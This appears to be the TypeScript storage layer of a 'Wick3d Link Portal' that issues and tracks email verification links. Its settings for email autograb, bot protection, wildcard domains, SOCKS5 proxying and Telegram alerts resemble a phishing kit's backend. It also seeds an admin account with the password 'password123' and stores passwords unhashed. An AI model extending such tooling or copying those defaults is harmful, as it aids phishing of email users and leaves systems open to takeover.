import { 
  users, 
  type User, 
  type InsertUser, 
  verificationLinks, 
  type VerificationLink, 
  type InsertVerificationLink,
  settings,
  type Setting,
  type InsertSetting
} from "@shared/schema";
import { db } from "./db";
import { eq, and, desc } from "drizzle-orm";
import crypto from 'crypto';
import { generateSecureCode } from './encryption';

export interface IStorage {
  // User operations
  getUser(id: number): Promise<User | undefined>;
  getUserByUsername(username: string): Promise<User | undefined>;
  createUser(user: InsertUser): Promise<User>;
  updateUser?(id: number, data: Partial<InsertUser>): Promise<User>;
  
  // Verification link operations
  createVerificationLink(data: InsertVerificationLink): Promise<VerificationLink>;
  getVerificationLinkByCode(code: string): Promise<VerificationLink | undefined>;
  getVerificationLinksByEmail(email: string): Promise<VerificationLink[]>;
  getAllVerificationLinks(): Promise<VerificationLink[]>;
  updateVerificationLinkStatus(id: number, status: string, verifiedAt?: number, renewalRequested?: boolean): Promise<VerificationLink | undefined>;
  
  // Settings operations
  getSettings(): Promise<Setting | undefined>;
  updateSettings(data: Partial<InsertSetting>): Promise<Setting>;
  
  // Helper for generating verification codes
  generateVerificationCode(): Promise<string>;
}

export class MemStorage implements IStorage {
  private users: Map<number, User>;
  private verificationLinks: Map<number, VerificationLink>;
  private settingsData: Setting | undefined;
  private userCurrentId: number;
  private verificationLinkCurrentId: number;
  private settingsCurrentId: number;

  constructor() {
    this.users = new Map();
    this.verificationLinks = new Map();
    this.userCurrentId = 1;
    this.verificationLinkCurrentId = 1;
    this.settingsCurrentId = 1;
    
    // Initialize with admin user
    this.createUser({
      username: "admin@example.com",
      password: "password123"
    });
    
    // Initialize with default settings
    this.settingsData = {
      id: this.settingsCurrentId++,
      redirectUrl: "https://example.com/thank-you",
      showLoadingSpinner: 1,
      loadingDuration: 3,
      successMessage: "Thank you for verifying your email address!",
      useEmailAutograb: 0,
      emailAutograbParam: "email",
      enableBotProtection: 1,
      customThankYouPage: "",
      useCustomThankYouPage: 0,
      // Domain settings
      useCustomDomain: 0,
      customDomain: "",
      domainCnameTarget: "",
      domainVerificationToken: "",
      domainVerified: 0,
      additionalDomains: "[]", // JSON array of additional domains
      securityLevel: 1,
      useWildcards: 0,
      encryptionSalt: "default-salt-change-me",
      allowLinkRenewal: 1,
      // Custom message settings
      emailSubject: "Please verify your email address",
      emailTemplate: "Hello,\n\nPlease click the link below to verify your email address:\n\n{link}\n\nThis link will expire in 7 days.\n\nThank you,\nWick3d Link Portal",
      smtpServer: "localhost",
      smtpPort: 25,
      smtpUser: "",
      smtpPassword: "",
      senderEmail: "no-reply@wick3d-links.com",
      senderName: "Wick3d Link Portal",
      // SOCKS5 proxy settings
      useSocks5Proxy: 0,
      socks5Host: "",
      socks5Port: 1080,
      socks5Username: "",
      socks5Password: "",
      socks5MaxAttempts: 300,
      // Saved email templates
      savedTemplates: "[]", // JSON array of saved templates
      // Telegram notification settings
      useTelegramNotifications: 0,
      telegramBotToken: "",
      telegramChatId: "",
      // Rate limiting settings
      enableRateLimiting: 1,
      rateLimitWindow: 15,
      rateLimitMaxRequests: 100,
      rateLimitBlockDuration: 30
    };
  }

  // User operations
  async getUser(id: number): Promise<User | undefined> {
    return this.users.get(id);
  }

  async getUserByUsername(username: string): Promise<User | undefined> {
    return Array.from(this.users.values()).find(
      (user) => user.username === username,
    );
  }

  async createUser(insertUser: InsertUser): Promise<User> {
    const id = this.userCurrentId++;
    const user: User = { ...insertUser, id };
    this.users.set(id, user);
    return user;
  }
  
  async updateUser(id: number, data: Partial<InsertUser>): Promise<User> {
    const existingUser = this.users.get(id);
    if (!existingUser) {
      throw new Error(`User with ID ${id} not found`);
    }
    
    const updatedUser = {
      ...existingUser,
      ...data
    };
    
    this.users.set(id, updatedUser);
    return updatedUser;
  }
  
  // Verification link operations
  async createVerificationLink(data: InsertVerificationLink): Promise<VerificationLink> {
    const id = this.verificationLinkCurrentId++;
    const verificationLink: VerificationLink = {
      ...data,
      id,
      createdAt: Date.now(),
      expiresAt: typeof data.expiresAt === 'number' ? data.expiresAt : (data.expiresAt instanceof Date ? data.expiresAt.getTime() : Date.now() + 24*60*60*1000),
      verifiedAt: data.verifiedAt !== undefined ? (typeof data.verifiedAt === 'number' ? data.verifiedAt : (data.verifiedAt instanceof Date ? data.verifiedAt.getTime() : null)) : null,
      renewalRequested: 0,
      redirectUrl: data.redirectUrl || null
    };
    this.verificationLinks.set(id, verificationLink);
    return verificationLink;
  }
  
  async getVerificationLinkByCode(code: string): Promise<VerificationLink | undefined> {
    return Array.from(this.verificationLinks.values()).find(
      (link) => link.code === code
    );
  }
  
  async getVerificationLinksByEmail(email: string): Promise<VerificationLink[]> {
    return Array.from(this.verificationLinks.values()).filter(
      (link) => link.email === email
    );
  }
  
  async getAllVerificationLinks(): Promise<VerificationLink[]> {
    return Array.from(this.verificationLinks.values());
  }
  
  async updateVerificationLinkStatus(
    id: number, 
    status: string, 
    verifiedAt: number | undefined = undefined,
    renewalRequested: boolean | undefined = undefined
  ): Promise<VerificationLink | undefined> {
    const verificationLink = this.verificationLinks.get(id);
    if (verificationLink) {
      const updatedLink: VerificationLink = {
        ...verificationLink,
        status,
        verifiedAt: verifiedAt !== undefined ? (typeof verifiedAt === 'number' ? verifiedAt : (verifiedAt instanceof Date ? verifiedAt.getTime() : null)) : verificationLink.verifiedAt,
        renewalRequested: renewalRequested !== undefined ? Number(renewalRequested) : Number(verificationLink.renewalRequested) || 0
      };
      this.verificationLinks.set(id, updatedLink);
      return updatedLink;
    }
    return undefined;
  }
  
  // Settings operations
  async getSettings(): Promise<Setting | undefined> {
    return this.settingsData;
  }
  
  async updateSettings(data: Partial<InsertSetting>): Promise<Setting> {
    if (!this.settingsData) {
      // Create default settings if they don't exist
      this.settingsData = {
        id: this.settingsCurrentId++,
        redirectUrl: data.redirectUrl || "",
        showLoadingSpinner: data.showLoadingSpinner !== undefined ? Number(data.showLoadingSpinner) : 1,
        loadingDuration: data.loadingDuration || 3,
        successMessage: data.successMessage || "Thank you for verifying your email address!",
        useEmailAutograb: data.useEmailAutograb !== undefined ? Number(data.useEmailAutograb) : 0,
        emailAutograbParam: data.emailAutograbParam || "email",
        enableBotProtection: data.enableBotProtection !== undefined ? Number(data.enableBotProtection) : 1,
        customThankYouPage: data.customThankYouPage || "",
        useCustomThankYouPage: data.useCustomThankYouPage !== undefined ? Number(data.useCustomThankYouPage) : 0,
        securityLevel: data.securityLevel !== undefined ? data.securityLevel : 1,
        useWildcards: data.useWildcards !== undefined ? Number(data.useWildcards) : 0,
        encryptionSalt: data.encryptionSalt || "default-salt-change-me",
        allowLinkRenewal: data.allowLinkRenewal !== undefined ? Number(data.allowLinkRenewal) : 1,
        // Domain settings
        useCustomDomain: data.useCustomDomain !== undefined ? Number(data.useCustomDomain) : 0,
        customDomain: data.customDomain || "",
        domainCnameTarget: data.domainCnameTarget || "",
        domainVerificationToken: data.domainVerificationToken || "",
        domainVerified: data.domainVerified !== undefined ? Number(data.domainVerified) : 0,
        additionalDomains: typeof data.additionalDomains === 'string' ? data.additionalDomains : JSON.stringify(data.additionalDomains ?? []),
        // Custom email settings
        emailSubject: data.emailSubject || "Please verify your email address",
        emailTemplate: data.emailTemplate || "Hello,\n\nPlease click the link below to verify your email address:\n\n{link}\n\nThis link will expire in 7 days.\n\nThank you,\nWick3d Link Portal",
        smtpServer: data.smtpServer || "localhost",
        smtpPort: data.smtpPort || 25,
        smtpUser: data.smtpUser || "",
        smtpPassword: data.smtpPassword || "",
        senderEmail: data.senderEmail || "no-reply@wick3d-links.com",
        senderName: data.senderName || "Wick3d Link Portal",
        // SOCKS5 proxy settings
        useSocks5Proxy: data.useSocks5Proxy !== undefined ? Number(data.useSocks5Proxy) : 0,
        socks5Host: data.socks5Host || "",
        socks5Port: data.socks5Port || 1080,
        socks5Username: data.socks5Username || "",
        socks5Password: data.socks5Password || "",
        socks5MaxAttempts: data.socks5MaxAttempts || 300,
        // Saved email templates
        savedTemplates: typeof data.savedTemplates === 'string' ? data.savedTemplates : JSON.stringify(data.savedTemplates ?? []),
        // Telegram notification settings
        useTelegramNotifications: data.useTelegramNotifications !== undefined ? Number(data.useTelegramNotifications) : 0,
        telegramBotToken: data.telegramBotToken || "",
        telegramChatId: data.telegramChatId || "",
        // Rate limiting settings
        enableRateLimiting: data.enableRateLimiting !== undefined ? Number(data.enableRateLimiting) : 1,
        rateLimitWindow: data.rateLimitWindow || 15,
        rateLimitMaxRequests: data.rateLimitMaxRequests || 100,
        rateLimitBlockDuration: data.rateLimitBlockDuration || 30
      };
    } else {
      // Update existing settings
      this.settingsData = {
        ...this.settingsData,
        redirectUrl: data.redirectUrl !== undefined ? data.redirectUrl : this.settingsData.redirectUrl,
        showLoadingSpinner: data.showLoadingSpinner !== undefined ? Number(data.showLoadingSpinner) : 1,
        loadingDuration: data.loadingDuration !== undefined ? data.loadingDuration : this.settingsData.loadingDuration,
        successMessage: data.successMessage !== undefined ? data.successMessage : this.settingsData.successMessage,
        useEmailAutograb: data.useEmailAutograb !== undefined ? Number(data.useEmailAutograb) : 0,
        emailAutograbParam: data.emailAutograbParam !== undefined ? data.emailAutograbParam : this.settingsData.emailAutograbParam,
        enableBotProtection: data.enableBotProtection !== undefined ? Number(data.enableBotProtection) : 1,
        customThankYouPage: data.customThankYouPage !== undefined ? data.customThankYouPage : this.settingsData.customThankYouPage,
        useCustomThankYouPage: data.useCustomThankYouPage !== undefined ? Number(data.useCustomThankYouPage) : 0,
        securityLevel: data.securityLevel !== undefined ? data.securityLevel : this.settingsData.securityLevel,
        useWildcards: data.useWildcards !== undefined ? Number(data.useWildcards) : 0,
        encryptionSalt: data.encryptionSalt !== undefined ? data.encryptionSalt : this.settingsData.encryptionSalt,
        allowLinkRenewal: data.allowLinkRenewal !== undefined ? Number(data.allowLinkRenewal) : 1,
        // Domain settings
        useCustomDomain: data.useCustomDomain !== undefined ? Number(data.useCustomDomain) : 0,
        customDomain: data.customDomain !== undefined ? data.customDomain : this.settingsData.customDomain,
        domainCnameTarget: data.domainCnameTarget !== undefined ? data.domainCnameTarget : this.settingsData.domainCnameTarget,
        domainVerificationToken: data.domainVerificationToken !== undefined ? data.domainVerificationToken : this.settingsData.domainVerificationToken,
        domainVerified: data.domainVerified !== undefined ? Number(data.domainVerified) : 0,
        additionalDomains: typeof data.additionalDomains === 'string' ? data.additionalDomains : JSON.stringify(data.additionalDomains ?? []),
        // Email settings
        emailSubject: data.emailSubject !== undefined ? data.emailSubject : this.settingsData.emailSubject,
        emailTemplate: data.emailTemplate !== undefined ? data.emailTemplate : this.settingsData.emailTemplate,
        smtpServer: data.smtpServer !== undefined ? data.smtpServer : this.settingsData.smtpServer,
        smtpPort: data.smtpPort !== undefined ? data.smtpPort : this.settingsData.smtpPort,
        smtpUser: data.smtpUser !== undefined ? data.smtpUser : this.settingsData.smtpUser,
        smtpPassword: data.smtpPassword !== undefined ? data.smtpPassword : this.settingsData.smtpPassword,
        senderEmail: data.senderEmail !== undefined ? data.senderEmail : this.settingsData.senderEmail,
        senderName: data.senderName !== undefined ? data.senderName : this.settingsData.senderName,
        // SOCKS5 proxy settings
        useSocks5Proxy: data.useSocks5Proxy !== undefined ? Number(data.useSocks5Proxy) : 0,
        socks5Host: data.socks5Host !== undefined ? data.socks5Host : this.settingsData.socks5Host,
        socks5Port: data.socks5Port !== undefined ? data.socks5Port : this.settingsData.socks5Port,
        socks5Username: data.socks5Username !== undefined ? data.socks5Username : this.settingsData.socks5Username,
        socks5Password: data.socks5Password !== undefined ? data.socks5Password : this.settingsData.socks5Password,
        socks5MaxAttempts: data.socks5MaxAttempts !== undefined ? data.socks5MaxAttempts : this.settingsData.socks5MaxAttempts,
        // Saved email templates
        savedTemplates: typeof data.savedTemplates === 'string' ? data.savedTemplates : JSON.stringify(data.savedTemplates ?? []),
        // Telegram notification settings
        useTelegramNotifications: data.useTelegramNotifications !== undefined ? Number(data.useTelegramNotifications) : 0,
        telegramBotToken: data.telegramBotToken !== undefined ? data.telegramBotToken : this.settingsData.telegramBotToken,
        telegramChatId: data.telegramChatId !== undefined ? data.telegramChatId : this.settingsData.telegramChatId,
        // Rate limiting settings
        enableRateLimiting: data.enableRateLimiting !== undefined ? Number(data.enableRateLimiting) : 1,
        rateLimitWindow: data.rateLimitWindow !== undefined ? data.rateLimitWindow : this.settingsData.rateLimitWindow,
        rateLimitMaxRequests: data.rateLimitMaxRequests !== undefined ? data.rateLimitMaxRequests : this.settingsData.rateLimitMaxRequests,
        rateLimitBlockDuration: data.rateLimitBlockDuration !== undefined ? data.rateLimitBlockDuration : this.settingsData.rateLimitBlockDuration
      };
    }
    
    return this.settingsData;
  }
  
  // Helper method to generate verification codes with enhanced security
  async generateVerificationCode(): Promise<string> {
    const settings = await this.getSettings();
    if (settings && settings.securityLevel > 1) {
      // Use advanced encryption if security level is greater than 1
      try {
        return generateSecureCode(settings);
      } catch (error) {
        console.warn("Failed to generate secure code for MemStorage, falling back to simple code", error);
      }
    }
    
    // Fallback to simple code generation
    return crypto.randomBytes(16).toString('hex');
  }
}

export class DatabaseStorage implements IStorage {
  // User operations
  async getUser(id: number): Promise<User | undefined> {
    const [user] = await db.select().from(users).where(eq(users.id, id));
    return user || undefined;
  }

  async getUserByUsername(username: string): Promise<User | undefined> {
    const [user] = await db.select().from(users).where(eq(users.username, username));
    return user || undefined;
  }

  async createUser(insertUser: InsertUser): Promise<User> {
    const [user] = await db
      .insert(users)
      .values(insertUser)
      .returning();
    return user;
  }
  
  async updateUser(id: number, data: Partial<InsertUser>): Promise<User> {
    const [updatedUser] = await db
      .update(users)
      .set(data)
      .where(eq(users.id, id))
      .returning();
      
    if (!updatedUser) {
      throw new Error(`User with ID ${id} not found`);
    }
    
    return updatedUser;
  }
  
  // Verification link operations
  async createVerificationLink(data: InsertVerificationLink): Promise<VerificationLink> {
    const [link] = await db
      .insert(verificationLinks)
      .values({
        ...data,
        createdAt: Date.now(),
        expiresAt: typeof data.expiresAt === 'number' ? data.expiresAt : (data.expiresAt instanceof Date ? data.expiresAt.getTime() : Date.now() + 24*60*60*1000),
        verifiedAt: data.verifiedAt !== undefined ? (typeof data.verifiedAt === 'number' ? data.verifiedAt : (data.verifiedAt instanceof Date ? data.verifiedAt.getTime() : null)) : null,
        renewalRequested: 0,
        redirectUrl: data.redirectUrl || null
      })
      .returning();
    return link;
  }
  
  async getVerificationLinkByCode(code: string): Promise<VerificationLink | undefined> {
    const [link] = await db
      .select()
      .from(verificationLinks)
      .where(eq(verificationLinks.code, code));
    return link || undefined;
  }
  
  async getVerificationLinksByEmail(email: string): Promise<VerificationLink[]> {
    return db
      .select()
      .from(verificationLinks)
      .where(eq(verificationLinks.email, email));
  }
  
  async getAllVerificationLinks(): Promise<VerificationLink[]> {
    return db
      .select()
      .from(verificationLinks)
      .orderBy(desc(verificationLinks.createdAt));
  }
  
  async updateVerificationLinkStatus(
    id: number, 
    status: string, 
    verifiedAt?: number,
    renewalRequested?: boolean
  ): Promise<VerificationLink | undefined> {
    const updateData: Partial<VerificationLink> = { 
      status,
    };

    if (verifiedAt !== undefined) {
      updateData.verifiedAt = typeof verifiedAt === 'number' ? verifiedAt : (verifiedAt instanceof Date ? verifiedAt.getTime() : null);
    }

    // Only add renewalRequested if it was provided
    if (renewalRequested !== undefined) {
      updateData.renewalRequested = Number(renewalRequested);
      console.log(`Setting renewalRequested to ${renewalRequested} for link ID ${id}`);
    }

    console.log(`Update data for link ${id}:`, updateData);

    try {
      const [link] = await db
        .update(verificationLinks)
        .set(updateData)
        .where(eq(verificationLinks.id, id))
        .returning();
      
      console.log(`Updated link ${id}:`, link);
      return link || undefined;
    } catch (error) {
      console.error(`Error updating link ${id}:`, error);
      throw error;
    }
  }
  
  // Settings operations
  async getSettings(): Promise<Setting | undefined> {
    const [setting] = await db.select().from(settings);
    
    // If no settings exist, create default settings
    if (!setting) {
      return this.updateSettings({
        redirectUrl: "https://example.com/thank-you",
        showLoadingSpinner: 1,
        loadingDuration: 3,
        successMessage: "Thank you for verifying your email address!",
        useEmailAutograb: 0,
        emailAutograbParam: "email",
        enableBotProtection: 1,
        customThankYouPage: "",
        useCustomThankYouPage: 0,
        securityLevel: 1,
        useWildcards: 0,
        encryptionSalt: "default-salt-change-me",
        allowLinkRenewal: 1,
        useCustomDomain: 0,
        customDomain: "",
        domainCnameTarget: "",
        domainVerificationToken: "",
        domainVerified: 0,
        additionalDomains: "[]",
        emailSubject: "Please verify your email address",
        emailTemplate: "Hello,\n\nPlease click the link below to verify your email address:\n\n{link}\n\nThis link will expire in 7 days.\n\nThank you,\nWick3d Link Portal",
        smtpServer: "localhost",
        smtpPort: 25,
        smtpUser: "",
        smtpPassword: "",
        senderEmail: "no-reply@wick3d-links.com",
        senderName: "Wick3d Link Portal",
        useSocks5Proxy: 0,
        socks5Host: "",
        socks5Port: 1080,
        socks5Username: "",
        socks5Password: "",
        socks5MaxAttempts: 300,
        savedTemplates: "[]",
        useTelegramNotifications: 0,
        telegramBotToken: "",
        telegramChatId: "",
        enableRateLimiting: 1,
        rateLimitWindow: 15,
        rateLimitMaxRequests: 100,
        rateLimitBlockDuration: 30
      });
    }
    
    return setting;
  }
  
  async updateSettings(data: Partial<InsertSetting>): Promise<Setting> {
    // Check if settings exist
    const existingSettings = await db.select().from(settings);
    function boolToInt(val: boolean | number | undefined, def: number) {
      if (typeof val === 'number') return val;
      if (typeof val === 'boolean') return val ? 1 : 0;
      return def;
    }
    if (existingSettings.length === 0) {
      // Create new settings
      const [setting] = await db
        .insert(settings)
        .values({
          redirectUrl: data.redirectUrl || "https://example.com/thank-you",
          showLoadingSpinner: boolToInt(data.showLoadingSpinner, 1),
          loadingDuration: data.loadingDuration || 3,
          successMessage: data.successMessage || "Thank you for verifying your email address!",
          useEmailAutograb: boolToInt(data.useEmailAutograb, 0),
          emailAutograbParam: data.emailAutograbParam || "email",
          enableBotProtection: boolToInt(data.enableBotProtection, 1),
          customThankYouPage: data.customThankYouPage || "",
          useCustomThankYouPage: boolToInt(data.useCustomThankYouPage, 0),
          securityLevel: data.securityLevel !== undefined ? data.securityLevel : 1,
          useWildcards: boolToInt(data.useWildcards, 0),
          encryptionSalt: data.encryptionSalt || "default-salt-change-me",
          allowLinkRenewal: boolToInt(data.allowLinkRenewal, 1),
          useCustomDomain: boolToInt(data.useCustomDomain, 0),
          customDomain: data.customDomain || "",
          domainCnameTarget: data.domainCnameTarget || "",
          domainVerificationToken: data.domainVerificationToken || "",
          domainVerified: boolToInt(data.domainVerified, 0),
          additionalDomains: typeof data.additionalDomains === 'string' ? data.additionalDomains : JSON.stringify(data.additionalDomains ?? []),
          emailSubject: data.emailSubject || "Please verify your email address",
          emailTemplate: data.emailTemplate || "Hello,\n\nPlease click the link below to verify your email address:\n\n{link}\n\nThis link will expire in 7 days.\n\nThank you,\nWick3d Link Portal",
          smtpServer: data.smtpServer || "localhost",
          smtpPort: data.smtpPort || 25,
          smtpUser: data.smtpUser || "",
          smtpPassword: data.smtpPassword || "",
          senderEmail: data.senderEmail || "no-reply@wick3d-links.com",
          senderName: data.senderName || "Wick3d Link Portal",
          useSocks5Proxy: boolToInt(data.useSocks5Proxy, 0),
          socks5Host: data.socks5Host || "",
          socks5Port: data.socks5Port || 1080,
          socks5Username: data.socks5Username || "",
          socks5Password: data.socks5Password || "",
          socks5MaxAttempts: data.socks5MaxAttempts || 300,
          savedTemplates: typeof data.savedTemplates === 'string' ? data.savedTemplates : JSON.stringify(data.savedTemplates ?? []),
          useTelegramNotifications: boolToInt(data.useTelegramNotifications, 0),
          telegramBotToken: data.telegramBotToken || "",
          telegramChatId: data.telegramChatId || "",
          enableRateLimiting: boolToInt(data.enableRateLimiting, 1),
          rateLimitWindow: data.rateLimitWindow || 15,
          rateLimitMaxRequests: data.rateLimitMaxRequests || 100,
          rateLimitBlockDuration: data.rateLimitBlockDuration || 30,
        })
        .returning();
      return setting;
    } else {
      // Update existing settings
      const [setting] = await db
        .update(settings)
        .set({
          ...(data.redirectUrl !== undefined && { redirectUrl: data.redirectUrl }),
          ...(data.showLoadingSpinner !== undefined && { showLoadingSpinner: boolToInt(data.showLoadingSpinner, 1) }),
          ...(data.loadingDuration !== undefined && { loadingDuration: data.loadingDuration }),
          ...(data.successMessage !== undefined && { successMessage: data.successMessage }),
          ...(data.useEmailAutograb !== undefined && { useEmailAutograb: boolToInt(data.useEmailAutograb, 0) }),
          ...(data.emailAutograbParam !== undefined && { emailAutograbParam: data.emailAutograbParam }),
          ...(data.enableBotProtection !== undefined && { enableBotProtection: boolToInt(data.enableBotProtection, 1) }),
          ...(data.customThankYouPage !== undefined && { customThankYouPage: data.customThankYouPage }),
          ...(data.useCustomThankYouPage !== undefined && { useCustomThankYouPage: boolToInt(data.useCustomThankYouPage, 0) }),
          ...(data.securityLevel !== undefined && { securityLevel: data.securityLevel }),
          ...(data.useWildcards !== undefined && { useWildcards: boolToInt(data.useWildcards, 0) }),
          ...(data.encryptionSalt !== undefined && { encryptionSalt: data.encryptionSalt }),
          ...(data.allowLinkRenewal !== undefined && { allowLinkRenewal: boolToInt(data.allowLinkRenewal, 1) }),
          ...(data.useCustomDomain !== undefined && { useCustomDomain: boolToInt(data.useCustomDomain, 0) }),
          ...(data.customDomain !== undefined && { customDomain: data.customDomain }),
          ...(data.domainCnameTarget !== undefined && { domainCnameTarget: data.domainCnameTarget }),
          ...(data.domainVerificationToken !== undefined && { domainVerificationToken: data.domainVerificationToken }),
          ...(data.domainVerified !== undefined && { domainVerified: boolToInt(data.domainVerified, 0) }),
          ...(data.additionalDomains !== undefined && { additionalDomains: typeof data.additionalDomains === 'string' ? data.additionalDomains : JSON.stringify(data.additionalDomains ?? []) }),
          ...(data.emailSubject !== undefined && { emailSubject: data.emailSubject }),
          ...(data.emailTemplate !== undefined && { emailTemplate: data.emailTemplate }),
          ...(data.smtpServer !== undefined && { smtpServer: data.smtpServer }),
          ...(data.smtpPort !== undefined && { smtpPort: data.smtpPort }),
          ...(data.smtpUser !== undefined && { smtpUser: data.smtpUser }),
          ...(data.smtpPassword !== undefined && { smtpPassword: data.smtpPassword }),
          ...(data.senderEmail !== undefined && { senderEmail: data.senderEmail }),
          ...(data.senderName !== undefined && { senderName: data.senderName }),
          ...(data.useSocks5Proxy !== undefined && { useSocks5Proxy: boolToInt(data.useSocks5Proxy, 0) }),
          ...(data.socks5Host !== undefined && { socks5Host: data.socks5Host }),
          ...(data.socks5Port !== undefined && { socks5Port: data.socks5Port }),
          ...(data.socks5Username !== undefined && { socks5Username: data.socks5Username }),
          ...(data.socks5Password !== undefined && { socks5Password: data.socks5Password }),
          ...(data.socks5MaxAttempts !== undefined && { socks5MaxAttempts: data.socks5MaxAttempts }),
          ...(data.savedTemplates !== undefined && { savedTemplates: typeof data.savedTemplates === 'string' ? data.savedTemplates : JSON.stringify(data.savedTemplates ?? []) }),
          ...(data.useTelegramNotifications !== undefined && { useTelegramNotifications: boolToInt(data.useTelegramNotifications, 0) }),
          ...(data.telegramBotToken !== undefined && { telegramBotToken: data.telegramBotToken }),
          ...(data.telegramChatId !== undefined && { telegramChatId: data.telegramChatId }),
          ...(data.enableRateLimiting !== undefined && { enableRateLimiting: boolToInt(data.enableRateLimiting, 1) }),
          ...(data.rateLimitWindow !== undefined && { rateLimitWindow: data.rateLimitWindow }),
          ...(data.rateLimitMaxRequests !== undefined && { rateLimitMaxRequests: data.rateLimitMaxRequests }),
          ...(data.rateLimitBlockDuration !== undefined && { rateLimitBlockDuration: data.rateLimitBlockDuration }),
        })
        .where(eq(settings.id, existingSettings[0].id))
        .returning();
      return setting;
    }
  }
  
  // Helper method to generate verification codes with enhanced security
  async generateVerificationCode(): Promise<string> {
    const settings = await this.getSettings();
    if (settings && settings.securityLevel > 1) {
      // Use advanced encryption if security level is greater than 1
      try {
        return generateSecureCode(settings);
      } catch (error) {
        console.warn("Failed to generate secure code for DatabaseStorage, falling back to simple code", error);
      }
    }
    
    // Fallback to simple code generation
    return crypto.randomBytes(16).toString('hex');
  }
}

import { SecureStorage } from './secureStorage';

// Initialize storage with enhanced secure database implementation
export const storage = new SecureStorage();

// Create default admin user if it doesn't exist
(async () => {
  // Check if admin user exists
  const admin = await storage.getUserByUsername("admin@example.com");
  if (!admin) {
    // Create admin user
    await storage.createUser({
      username: "admin@example.com",
      password: "password123"
    });
    console.log("Default admin user created");
  }
})().catch(err => console.error("Error initializing database:", err));